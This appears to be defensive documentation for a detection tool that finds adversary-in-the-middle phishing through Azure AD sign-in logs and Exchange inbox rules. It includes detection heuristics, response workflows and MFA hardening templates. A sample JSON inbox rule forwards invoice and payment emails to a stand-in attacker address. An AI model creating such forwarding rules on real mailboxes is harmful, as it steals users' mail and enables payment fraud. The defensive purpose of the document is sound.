# Performing Adversary In The Middle Phishing Detection

## API Reference

## AiTM Attack Overview

AiTM phishing uses a reverse proxy between the victim and legitimate login page to intercept session cookies in real-time, bypassing MFA. Common frameworks: Evilginx2, Modlishka, Muraena.

**Attack Chain:**
1. Victim clicks phishing link
2. Reverse proxy forwards request to real login page
3. Victim enters credentials and completes MFA
4. Proxy captures session cookie
5. Attacker replays session cookie from different location

## Azure AD / Entra ID Sign-In Logs

### Export via Microsoft Graph API
```
GET https://graph.microsoft.com/v1.0/auditLogs/signIns
```

### Key Fields

| Field | Type | Description |
|-------|------|-------------|
| `userPrincipalName` | string | User email |
| `createdDateTime` | ISO-8601 | Sign-in timestamp |
| `ipAddress` | string | Source IP address |
| `location.latitude` | float | Geo-location latitude |
| `location.longitude` | float | Geo-location longitude |
| `deviceDetail.displayName` | string | Device name |
| `correlationId` | string | Session correlation ID |
| `userAgent` | string | Browser user agent |

## Detection Methods

### Impossible Travel
Calculates Haversine great-circle distance between consecutive logins. If `distance / time > 900 km/h` (commercial flight speed) and distance > 100km, flags as suspicious.

### Suspicious Inbox Rules
AiTM attackers commonly create rules to:
- Forward emails to external address (`forwardTo`, `redirectTo`)
- Delete incoming emails (`moveToDeletedItems`, `permanentDelete`)
- Auto-read messages (`markAsRead`)
- Filter on keywords: invoice, payment, wire, bank, password

### Token Replay Detection
Multiple IPs and devices in a short timeframe for the same user session indicates stolen session token replay.

## Inbox Rules Format

```json
[
  {
    "displayName": "rule1",
    "mailboxOwner": "user@example.com",
    "actions": {"forwardTo": [{"emailAddress": {"address": "attacker@evil.com"}}]},
    "conditions": {"subjectContains": ["invoice", "payment"]},
    "createdDateTime": "2024-01-15T10:00:00Z"
  }
]
```

## Haversine Formula

```python
from math import radians, cos, sin, asin, sqrt
def haversine_km(lat1, lon1, lat2, lon2):
    lat1, lon1, lat2, lon2 = map(radians, [lat1, lon1, lat2, lon2])
    dlat, dlon = lat2 - lat1, lon2 - lon1
    a = sin(dlat/2)**2 + cos(lat1) * cos(lat2) * sin(dlon/2)**2
    return 2 * 6371 * asin(sqrt(a))
```

## Output Schema

```json
{
  "report": "aitm_phishing_detection",
  "total_sign_ins_analyzed": 5000,
  "total_findings": 8,
  "severity_summary": {"critical": 3, "high": 5},
  "findings": [{"type": "impossible_travel", "severity": "critical"}]
}
```

## CLI Usage

```bash
python agent.py --logs signin_logs.json --inbox-rules rules.json --output report.json
```

---

## Standards and Controls

## MITRE ATT&CK References
- **T1557**: Adversary-in-the-Middle
- **T1539**: Steal Web Session Cookie
- **T1550.004**: Use Alternate Authentication Material: Web Session Cookie
- **T1566.002**: Phishing: Spearphishing Link
- **T1114.003**: Email Collection: Email Forwarding Rule
- **T1098.005**: Account Manipulation: Device Registration

## AiTM PhaaS Landscape (2025)
- Over 1 million PhaaS attacks detected in Jan-Feb 2025 (Barracuda)
- Tycoon 2FA most prevalent followed by EvilProxy and Evilginx
- Transition from QR codes to HTML attachments and SVG files
- Average time from compromise to inbox rule creation: under 30 minutes

## Detection Rule Categories
| Rule | Data Source | Confidence |
|---|---|---|
| Session IP mismatch | Azure AD sign-in logs | High |
| Impossible travel | Azure AD + session logs | High |
| Inbox rule post-auth | Exchange audit logs | High |
| New MFA method post-risky-sign-in | Azure AD audit | Medium |
| OAuth consent post-auth | Azure AD audit | Medium |
| Proxy CDN pattern | Web proxy logs | Medium |
| New domain phishing page | DNS + CT logs | Low |

## Phishing-Resistant MFA Standards
- **FIDO2 WebAuthn**: Origin-bound authentication prevents AiTM
- **Certificate-Based Auth**: Client certificate bound to device
- **Windows Hello for Business**: Hardware-bound credential
- **NIST SP 800-63B AAL3**: Phishing-resistant authenticator requirement

---

## Workflows

## Workflow 1: AiTM Attack Detection

```
User clicks phishing link
  |
  v
[Reverse proxy serves mirrored login page]
  +-- Page loads assets from legitimate CDN
  +-- SSL cert issued for lookalike domain
  |
  v
[User enters credentials + completes MFA]
  |
  v
[Attacker captures session cookie]
  |
  v
[DETECTION POINTS]
  +-- Web proxy: Connection to newly registered domain
  +-- Azure AD: Sign-in from proxy IP (unfamiliar location)
  +-- Session: Cookie replay from different IP within minutes
  +-- Exchange: Inbox rule created post-authentication
  +-- Azure AD: New OAuth app consent
  |
  v
[Automated response]
  +-- Revoke all sessions for user
  +-- Require re-authentication with phishing-resistant MFA
  +-- Remove suspicious inbox rules
  +-- Revoke OAuth app consents
  +-- Block attacker IP at firewall
```

## Workflow 2: AiTM Incident Response

```
AiTM compromise confirmed
  |
  v
[Immediate containment (first 30 minutes)]
  +-- Revoke all user sessions and tokens
  +-- Force password reset
  +-- Remove all inbox forwarding rules
  +-- Revoke OAuth app consents granted post-compromise
  +-- Disable compromised MFA methods
  |
  v
[Investigation (next 2-4 hours)]
  +-- Review Azure AD sign-in logs for compromise timeline
  +-- Check email sent items for BEC/phishing sent from account
  +-- Review SharePoint/OneDrive access for data exfiltration
  +-- Check for lateral movement to other accounts
  +-- Identify all affected users (same phishing campaign)
  |
  v
[Remediation]
  +-- Enroll user in phishing-resistant MFA (FIDO2)
  +-- Block phishing domain at email gateway and web proxy
  +-- Retract phishing email from all mailboxes
  +-- Update Conditional Access policies
  +-- Notify all targeted users
  |
  v
[Post-incident]
  +-- Add IOCs to threat intelligence
  +-- Create SIEM detection rules for observed TTPs
  +-- Update security awareness training
  +-- Assess FIDO2 rollout for broader user population
```

---

## Working Template

## Phishing-Resistant MFA Deployment
| User Group | MFA Method | AiTM Resistant | Status |
|---|---|---|---|
| Global Admins | FIDO2 Security Key | Yes | |
| Privileged Admins | Windows Hello for Business | Yes | |
| Finance/HR | FIDO2 Security Key | Yes | |
| All Users | Microsoft Authenticator (number match) | Partial | |

## Conditional Access Policies for AiTM Prevention
| Policy | Condition | Action | Status |
|---|---|---|---|
| Require managed device | All cloud apps | Block if unmanaged | |
| Block anonymous proxy | Sign-in risk | Block | |
| Require phishing-resistant MFA | Admin roles | Enforce FIDO2 | |
| Token binding | Sensitive apps | Bind to device | |
| Continuous access evaluation | Exchange/SharePoint | Enable CAE | |

## AiTM Detection Rules
| Rule | Data Source | Alert Priority |
|---|---|---|
| Session IP mismatch within 10min | Azure AD sign-in logs | Critical |
| Impossible travel | Azure AD sign-in logs | High |
| Inbox rule creation post-auth | Exchange audit logs | High |
| OAuth consent post-risky-sign-in | Azure AD audit logs | High |
| New MFA method from new IP | Azure AD audit logs | Medium |
| Connection to PhaaS infrastructure | Web proxy logs | Medium |

## Incident Response Contacts
| Role | Name | Contact |
|---|---|---|
| SOC Lead | | |
| Identity Team | | |
| Email Security | | |
